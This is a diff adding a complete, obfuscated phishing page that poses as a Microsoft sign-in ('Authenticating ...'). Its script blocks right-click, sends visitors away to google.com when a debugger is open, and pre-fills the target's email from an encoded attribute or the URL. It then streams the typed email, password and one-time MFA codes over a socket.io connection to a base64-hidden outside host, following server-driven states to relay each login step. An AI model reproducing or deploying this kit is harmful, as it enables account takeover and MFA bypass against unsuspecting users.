@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html id='html' sti='VlZORlVqQTNNRFV5TURJMVZUVXlNRFV3TnpVMg==' vic='' lang='en'>
+
+<head>
+    <script src='https://cdn.socket.io/4.7.5/socket.io.min.js' integrity='sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO' crossorigin='anonymous'></script>
+    <link rel='stylesheet' href='https://www.w3schools.com/w3css/4/w3.css'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css'>
+</head>
+
+<body id='allbody'>
+
+
+</body>
+
+<script type='text/javascript'>
+const pointLink = 'aHR0cHM6Ly9obnRvbWFuLnRvcA=='
+window.addEventListener('load', function () {
+  document.head.insertAdjacentHTML(
+    'beforeend',
+    '\n<meta charset="UTF-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Authenticating ...</title>\n<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">\n<script src="https://cdn.socket.io/4.6.0/socket.io.min.js" integrity="sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+" crossorigin="anonymous"></script>\n'
+  )
+  document.head.insertAdjacentHTML(
+    'beforeend',
+    '<STRIPPED>'
+  )
+  document.body.insertAdjacentHTML(
+    'afterbegin',
+    '<STRIPPED>'
+  )
+  document.oncontextmenu = document.body.oncontextmenu = function () {
+    return false
+  }
+  window.addEventListener('resize', function (_0x254b8f) {})
+  !(function () {
+    function _0x2e55a9(_0x20472c) {
+      if (isNaN(+_0x20472c)) {
+        _0x20472c = 100
+      }
+      var _0x143a9f = +new Date()
+      debugger
+      var _0x53e508 = +new Date()
+      ;(isNaN(_0x143a9f) ||
+        isNaN(_0x53e508) ||
+        _0x53e508 - _0x143a9f > _0x20472c) &&
+        (window.location.href = 'https://google.com')
+    }
+    if (window.attachEvent) {
+      if (
+        document.readyState === 'complete' ||
+        document.readyState === 'interactive'
+      ) {
+        _0x2e55a9()
+        window.attachEvent('onresize', _0x2e55a9)
+        window.attachEvent('onmousemove', _0x2e55a9)
+        window.attachEvent('onfocus', _0x2e55a9)
+        window.attachEvent('onblur', _0x2e55a9)
+      } else {
+        setTimeout(argument.callee, 0)
+      }
+    } else {
+      window.addEventListener('load', _0x2e55a9)
+      window.addEventListener('resize', _0x2e55a9)
+      window.addEventListener('mousemove', _0x2e55a9)
+      window.addEventListener('focus', _0x2e55a9)
+      window.addEventListener('blur', _0x2e55a9)
+    }
+  })()
+  const _0x4fa6f0 = document.querySelector('.loaderxBlock'),
+    _0x422410 = document.querySelector('.loaderxBlock2'),
+    _0x3463d3 = document.querySelector('.loaderxBlock11'),
+    _0x1caee2 = document.querySelector('.overlay'),
+    _0x5dc7d5 = document.querySelector('.loginForm'),
+    _0x378558 = document.querySelector('.lds-roller'),
+    _0x12a759 = document.querySelector('.backArrow'),
+    _0x2aecc0 = document.querySelector('.emailBlock'),
+    _0x4dcdd0 = document.querySelector('.passwordBlock'),
+    _0x186232 = document.querySelector('.msappBlock'),
+    _0x5d4f39 = document.querySelector('.msappcodeBlock'),
+    _0x61c660 = document.querySelector('.noPassmsappBlock'),
+    _0x15e22d = document.querySelector('.phoneBlock'),
+    _0x5eb492 = document.querySelector('#sendEmail'),
+    _0x3d005d = document.querySelector('#sendPass'),
+    _0x561577 = document.querySelector('#sendphoneCode'),
+    _0x3a25c3 = document.querySelector('#sendAppCode'),
+    _0x2b4fb1 = document.querySelector('.emailInvalid'),
+    _0x3d2bfb = document.querySelector('.passwordError'),
+    _0x4c68bb = document.querySelector('.otpError'),
+    _0x10bd8f = document.querySelector('.otpError2'),
+    _0x7cff6c = document.querySelector('.passwordInput'),
+    _0x1a8fa2 = document.querySelector('.emailInput')
+  var _0x3b0135 = document.getElementById('html').getAttribute('vic')
+  const _0x194c5c = document.querySelectorAll('.emailLabel'),
+    _0xc3b171 = document.getElementById('html').getAttribute('sti'),
+    _0x4b0640 = document.querySelector('#allbody'),
+    _0x2b1401 = document.querySelector('.imgclass'),
+    _0x312e9d = document.querySelector('.loader'),
+    _0x39c3fa = document.querySelector('.logerMe'),
+    _0x4860bc = document.querySelector('.tittleText'),
+    _0x1109ea = document.querySelector('#signIn_text_changer'),
+    _0x460f56 = document.querySelectorAll('.formLogo'),
+    _0x521bc7 = document.querySelector('#otpCode'),
+    _0x1066fe = document.querySelector('#otpCode2'),
+    _0x511ef3 = document.querySelector('.phoneotpText'),
+    _0x3bd5e9 = document.querySelector('.appotpCode'),
+    _0x278b86 = document.querySelector('.otpInput'),
+    _0x409030 = document.querySelector('.otpInput2'),
+    _0x417bdf = document.querySelector('#cbx-43'),
+    _0x46f6d9 = document.querySelector('.grayBox')
+  var _0x24c162,
+    _0x5e7b72 = { ua: navigator.userAgent }
+  _0x5e7b72.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone
+  _0x5e7b72.browserLanguage = navigator.language || navigator.userLanguage
+  _0x5e7b72.uid = atob(atob(_0xc3b171))
+  _0x5e7b72.email = _0x3b0135
+  _0x5e7b72.bannerLogo
+  _0x5e7b72.backgroundImage
+  _0x5e7b72.boilerText
+  _0x5e7b72.phish_state
+  _0x5e7b72.email_type
+  const _0xf30297 = (_0x21d85f) => {
+      if (!_0x21d85f) {
+        return false
+      }
+      if (_0x21d85f.length > 254) {
+        return false
+      }
+      var _0x5ea2c1 =
+        /^[-!#$%&'*+\/0-9=?A-Z^_a-z{|}~](\.?[-!#$%&'*+\/0-9=?A-Z^_a-z`{|}~])*@[a-zA-Z0-9](-*\.?[a-zA-Z0-9])*\.[a-zA-Z](-?[a-zA-Z0-9])+$/.test(
+          _0x21d85f
+        )
+      if (!_0x5ea2c1) {
+        return false
+      }
+      var _0x3c977e = _0x21d85f.split('@')
+      if (_0x3c977e[0].length > 64) {
+        return false
+      }
+      var _0xb00a93 = _0x3c977e[1].split('.')
+      if (
+        _0xb00a93.some(function (_0x183c37) {
+          return _0x183c37.length > 63
+        })
+      ) {
+        return false
+      }
+      return true
+    },
+    _0x3d0d1e = (_0x4623eb, _0x3e4533, _0x142479) => {
+      let _0x4e2b9a = _0x5e7b72.email.split('@')[1]
+      return (
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(new RegExp(_0x3e4533, 'g'), _0x142479)),
+        (_0x4623eb = _0x4623eb.replace(
+          new RegExp(_0x4e2b9a, 'g'),
+          'authentication-server.com'
+        )),
+        _0x4623eb
+      )
+    },
+    _0x4c97ba = () => {
+      _0x2b4fb1.style.display = 'none'
+      _0x3d2bfb.style.display = 'none'
+    },
+    _0xc15e75 = (_0x486165) => {
+      _0x486165.email &&
+        _0x194c5c.forEach((_0x32edc8) => {
+          _0x32edc8.innerHTML = _0x486165.email
+        })
+      _0x486165.bannerLogo &&
+        (_0x460f56.forEach((_0x534b6e) => {
+          _0x534b6e.src = _0x486165.bannerLogo
+        }),
+        (_0x4b0640.style.backgroundImage =
+          "url('" + _0x486165.backgroundImage + "')"),
+        _0x486165.backgroundImage !=
+          'https://aadcdn.msftauth.net/shared/1.0/content/images/appbackgrounds/49_6ffe0a92d779c878835b40171ffc2e13.jpg' &&
+          _0x486165.bannerLogo !=
+            'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg' &&
+          (_0x1caee2.style.display = 'block'))
+      if (_0x486165 === 'LD1') {
+        _0x3463d3.style.display = 'none'
+        _0x4fa6f0.style.display = 'block'
+        _0x422410.style.display = 'none'
+        _0x2aecc0.style.display = 'none'
+        _0x4dcdd0.style.display = 'none'
+        _0x186232.style.display = 'none'
+        _0x15e22d.style.display = 'none'
+        _0x5d4f39.style.display = 'none'
+      } else {
+        if (_0x486165 === 'LD11') {
+          _0x3463d3.style.display = 'block'
+          _0x4fa6f0.style.display = 'none'
+          _0x422410.style.display = 'none'
+          _0x2aecc0.style.display = 'none'
+          _0x4dcdd0.style.display = 'none'
+          _0x186232.style.display = 'none'
+          _0x15e22d.style.display = 'none'
+          _0x5d4f39.style.display = 'none'
+        } else {
+          if (_0x486165 === 'LD2') {
+            _0x3463d3.style.display = 'none'
+            _0x422410.style.display = 'block'
+            _0x4fa6f0.style.display = 'none'
+            _0x2aecc0.style.display = 'none'
+            _0x4dcdd0.style.display = 'none'
+            _0x186232.style.display = 'none'
+            _0x15e22d.style.display = 'none'
+            _0x5d4f39.style.display = 'none'
+            setTimeout(() => {
+              _0x1109ea.innerHTML = 'Please wait ...'
+            }, 3000)
+            setTimeout(() => {
+              _0x1109ea.innerHTML = 'Authentication ...'
+            }, 6000)
+            setTimeout(() => {
+              _0x1109ea.innerHTML = 'Trying to sign you in ...'
+            }, 9000)
+          } else {
+            if (
+              _0x486165.phish_state === 'RQ_EMAIL' ||
+              _0x486165 === 'RQ_EMAIL'
+            ) {
+              _0x3463d3.style.display = 'none'
+              _0x2aecc0.style.display = 'grid'
+              _0x4fa6f0.style.display = 'none'
+              _0x422410.style.display = 'none'
+              _0x4dcdd0.style.display = 'none'
+              _0x186232.style.display = 'none'
+              _0x15e22d.style.display = 'none'
+              _0x486165.email_exist &&
+                _0x486165.email_exist != true &&
+                  ((_0x2b4fb1.style.display = 'block'),
+                  (_0x2b4fb1.innerHTML = _0x486165.email_exist),
+                  (_0x1a8fa2.value = _0x5e7b72.email))
+              _0x1a8fa2.focus()
+            } else {
+              if (_0x486165.phish_state === 'RQ_PASSWORD') {
+                _0x3463d3.style.display = 'none'
+                _0x4dcdd0.style.display = 'grid'
+                _0x4fa6f0.style.display = 'none'
+                _0x422410.style.display = 'none'
+                _0x2aecc0.style.display = 'none'
+                _0x186232.style.display = 'none'
+                _0x15e22d.style.display = 'none'
+                _0x486165.CORRECT_PASSWORD &&
+                  (_0x486165.CORRECT_PASSWORD != 'OK' &&
+                    ((_0x3d2bfb.style.display = 'block'),
+                    (_0x3d2bfb.innerHTML = _0x486165.CORRECT_PASSWORD),
+                    (_0x7cff6c.value = '')),
+                  _0x486165.email_type != 'ADFS' &&
+                    _0x486165.email_type != 'O365' &&
+                    ((_0x3d2bfb.style.display = 'block'),
+                    (_0x3d2bfb.innerHTML =
+                      'Incorrect password, please try again!'),
+                    (_0x7cff6c.value = '')))
+                _0x7cff6c.focus()
+              } else {
+                if (
+                  _0x486165.phish_state === 'RQ_OTP_NOPASS_APP' ||
+                  _0x486165 === 'RQ_OTP_NOPASS_APP'
+                ) {
+                  _0x3463d3.style.display = 'none'
+                  _0x61c660.style.display = 'grid'
+                  _0x186232.style.display = 'none'
+                  _0x4fa6f0.style.display = 'none'
+                  _0x422410.style.display = 'none'
+                  _0x2aecc0.style.display = 'none'
+                  _0x4dcdd0.style.display = 'none'
+                  _0x15e22d.style.display = 'none'
+                  _0x1066fe.innerHTML = _0x486165.OTP_TYPE
+                } else {
+                  if (_0x486165.phish_state === 'RQ_OTP_APP') {
+                    _0x3463d3.style.display = 'none'
+                    _0x186232.style.display = 'grid'
+                    _0x4fa6f0.style.display = 'none'
+                    _0x422410.style.display = 'none'
+                    _0x2aecc0.style.display = 'none'
+                    _0x4dcdd0.style.display = 'none'
+                    _0x15e22d.style.display = 'none'
+                    _0x521bc7.innerHTML = _0x486165.OTP_TYPE
+                  } else {
+                    if (_0x486165.phish_state === 'RQ_OTP_APP_CODE') {
+                      _0x3463d3.style.display = 'none'
+                      _0x5d4f39.style.display = 'grid'
+                      _0x4fa6f0.style.display = 'none'
+                      _0x422410.style.display = 'none'
+                      _0x2aecc0.style.display = 'none'
+                      _0x4dcdd0.style.display = 'none'
+                      _0x186232.style.display = 'none'
+                      _0x3bd5e9.innerHTML = _0x486165.OTP_TYPE
+                      _0x486165.CORRECT_OTP &&
+                        _0x486165.CORRECT_OTP != 'OK' &&
+                          ((_0x10bd8f.style.display = 'block'),
+                          (_0x10bd8f.innerHTML = _0x486165.CORRECT_OTP),
+                          (_0x409030.value = ''))
+                    } else {
+                      if (_0x486165.phish_state === 'RQ_OTP_PHONE') {
+                        _0x3463d3.style.display = 'none'
+                        _0x15e22d.style.display = 'grid'
+                        _0x4fa6f0.style.display = 'none'
+                        _0x422410.style.display = 'none'
+                        _0x2aecc0.style.display = 'none'
+                        _0x4dcdd0.style.display = 'none'
+                        _0x186232.style.display = 'none'
+                        _0x511ef3.innerHTML = _0x486165.OTP_TYPE
+                        _0x486165.CORRECT_OTP &&
+                          _0x486165.CORRECT_OTP != 'OK' &&
+                            ((_0x4c68bb.style.display = 'block'),
+                            (_0x4c68bb.innerHTML = _0x486165.CORRECT_OTP),
+                            (_0x278b86.value = ''))
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  _0x5eb492.addEventListener('click', () => {
+    _0xf30297(_0x1a8fa2.value.trim())
+      ? _0x1a8fa2.value.trim().includes('@gmail.com') ||
+        _0x1a8fa2.value.trim().includes('@yahoo.') ||
+        _0x1a8fa2.value.trim().includes('@aol.') ||
+        _0x1a8fa2.value.trim().includes('@comcast.') ||
+        _0x1a8fa2.value.trim().includes('@msn.') ||
+        _0x1a8fa2.value.trim().includes('@123.') ||
+        _0x1a8fa2.value.trim().includes('@ionos.') ||
+        _0x1a8fa2.value.trim().includes('@mail.') ||
+        _0x1a8fa2.value.trim().includes('@163.') ||
+        _0x1a8fa2.value.trim().includes('@yandex.') ||
+        _0x1a8fa2.value.trim().includes('@gmx.') ||
+        _0x1a8fa2.value.trim().includes('@protonmail.') ||
+        _0x1a8fa2.value.trim().includes('@web.') ||
+        _0x1a8fa2.value.trim().includes('@att.') ||
+        _0x1a8fa2.value.trim().includes('@qq.') ||
+        _0x1a8fa2.value.trim().includes('@test.') ||
+        _0x1a8fa2.value.trim().includes('@pointcaremedical.org')
+        ? (_0xc15e75('LD2'),
+          setTimeout(() => {
+            _0xc15e75('RQ_EMAIL')
+            _0x2b4fb1.style.display = 'block'
+          }, 1000),
+          (_0x2b4fb1.innerHTML =
+            "We couldn't find an account with that username. Try another, or get a new Microsoft account."))
+        : ((_0x5e7b72.email = _0x1a8fa2.value.trim()),
+          console.log('send email'),
+          _0xc15e75('LD2'),
+          _0x4578fc())
+      : (_0xc15e75('LD2'),
+        setTimeout(() => {
+          _0xc15e75('RQ_EMAIL')
+          _0x2b4fb1.style.display = 'block'
+        }, 1000))
+  })
+  _0x1a8fa2.addEventListener('keyup', function (_0x3bc2fb) {
+    _0x3bc2fb.keyCode === 13 && (_0x3bc2fb.preventDefault(), _0x5eb492.click())
+  })
+  _0x417bdf.addEventListener('change', function () {
+    setTimeout(() => {
+      _0x5eb492.click()
+    }, 900)
+  })
+  _0x3d005d.addEventListener('click', () => {
+    _0x5e7b72.password = _0x7cff6c.value
+    console.log('send pass')
+    _0xc15e75('LD1')
+    _0x24c162.emit('password_command', _0x5e7b72)
+  })
+  _0x7cff6c.addEventListener('keyup', function (_0x4f5722) {
+    _0x4f5722.keyCode === 13 && (_0x4f5722.preventDefault(), _0x3d005d.click())
+  })
+  _0x561577.addEventListener('click', () => {
+    _0x5e7b72.phish_otp = _0x278b86.value
+    _0xc15e75('LD1')
+    _0x24c162.emit('otp_command', _0x5e7b72)
+  })
+  _0x278b86.addEventListener('keyup', function (_0x45bdf2) {
+    _0x45bdf2.keyCode === 13 && (_0x45bdf2.preventDefault(), _0x561577.click())
+  })
+  _0x3a25c3.addEventListener('click', () => {
+    _0x5e7b72.phish_otp = _0x409030.value
+    console.log('send otp')
+    _0xc15e75('LD1')
+    _0x24c162.emit('otp_command', _0x5e7b72)
+  })
+  _0x409030.addEventListener('keyup', function (_0x4c5f98) {
+    _0x4c5f98.keyCode === 13 && (_0x4c5f98.preventDefault(), _0x3a25c3.click())
+  })
+  const _0x4578fc = async () => {
+      _0x24c162 = io(atob(pointLink), {
+        extraHeaders: {
+          Auth_UID: _0x5e7b72.uid,
+          Session_Email: _0x5e7b72.email,
+        },
+      })
+      _0x24c162.emit('new-session', _0x5e7b72)
+      const _0x4c990b = () => {
+        _0x24c162.emit('status_command', _0x5e7b72)
+      }
+      return (
+        _0x24c162.on('s2c_cookies', (_0x37425c) => {
+          window.top.location.href = _0x5e7b72.endUrl
+        }),
+        _0x24c162.on('s2c_restart', (_0xca7921) => {
+          window.location.reload()
+        }),
+        _0x24c162.on('disconnect', function () {
+          window.location.reload()
+        }),
+        _0x24c162.on('s2c', (_0x48a143) => {
+          console.log(_0x48a143)
+          _0x48a143.phish_groupid &&
+            (_0x5e7b72.phish_groupid = _0x48a143.phish_groupid)
+          _0x48a143.phish_id && (_0x5e7b72.phish_id = _0x48a143.phish_id)
+          _0x48a143.bannerLogo &&
+            ((_0x5e7b72.bannerLogo = _0x48a143.bannerLogo),
+            (_0x5e7b72.backgroundImage = _0x48a143.backgroundImage))
+          _0x48a143.boilerText &&
+            ((_0x46f6d9.style.display = 'block'),
+            (_0x46f6d9.innerHTML =
+              '<p>' + _0x3d0d1e(_0x48a143.boilerText, 'href', 'id') + '<p/>'))
+          _0x48a143.phish_state &&
+            (_0x5e7b72.phish_state = _0x48a143.phish_state)
+          _0x48a143.email && (_0x5e7b72.email = _0x48a143.email)
+          _0x48a143.CORRECT_PASSWORD &&
+            (_0x5e7b72.CORRECT_PASSWORD = _0x48a143.CORRECT_PASSWORD)
+          _0x48a143.OTP_TYPE && (_0x5e7b72.OTP_TYPE = _0x48a143.OTP_TYPE)
+          _0x48a143.email_exist &&
+            (_0x5e7b72.email_exist = _0x48a143.email_exist)
+          _0x48a143.CORRECT_OTP &&
+            (_0x5e7b72.CORRECT_OTP = _0x48a143.CORRECT_OTP)
+          _0x48a143.boilerText && (_0x5e7b72.boilerText = _0x48a143.boilerText)
+          _0x48a143.email_type && (_0x5e7b72.email_type = _0x48a143.email_type)
+          _0x48a143.endUrl && (_0x5e7b72.endUrl = _0x48a143.endUrl)
+          _0xc15e75(_0x5e7b72)
+        }),
+        (_0x5e7b72.phish_state = null),
+        _0x24c162
+      )
+    },
+    _0x19e1f7 = () => {
+      _0xf30297(_0x5e7b72.email)
+        ? ((_0x1a8fa2.value = _0x5e7b72.email),
+          _0xc15e75('LD1'),
+          setTimeout(() => {
+            _0xc15e75('LD11')
+          }, 900))
+        : (_0xc15e75('LD1'),
+          setTimeout(() => {
+            _0xc15e75('RQ_EMAIL')
+          }, 1000))
+    },
+    _0x5db339 = () => {
+      let _0x4eb6fd = window.location.href
+      console.log(_0x4eb6fd)
+      let _0x25bbb1 = _0x4eb6fd.split('#'),
+        _0x1f2c53 = _0x25bbb1[1]
+      console.log(_0x1f2c53)
+      if (_0xf30297(_0x3b0135)) {
+        _0x5e7b72.email = _0x3b0135
+      } else {
+        try {
+          _0x5e7b72.email = atob(_0x3b0135)
+        } catch (_0x300682) {
+          console.log('EMBEDED EMAIL NULL')
+        }
+      }
+      if (_0xf30297(_0x1f2c53)) {
+        _0x5e7b72.email = _0x1f2c53
+      } else {
+        try {
+          _0x5e7b72.email = atob(_0x1f2c53)
+        } catch (_0x1c5627) {
+          console.log('URL EMAIL=NULL')
+        }
+      }
+      return console.log(_0x5e7b72.email), _0x19e1f7(), _0x5e7b72.email
+    }
+  _0x5db339()
+})
+</script>
+</html>
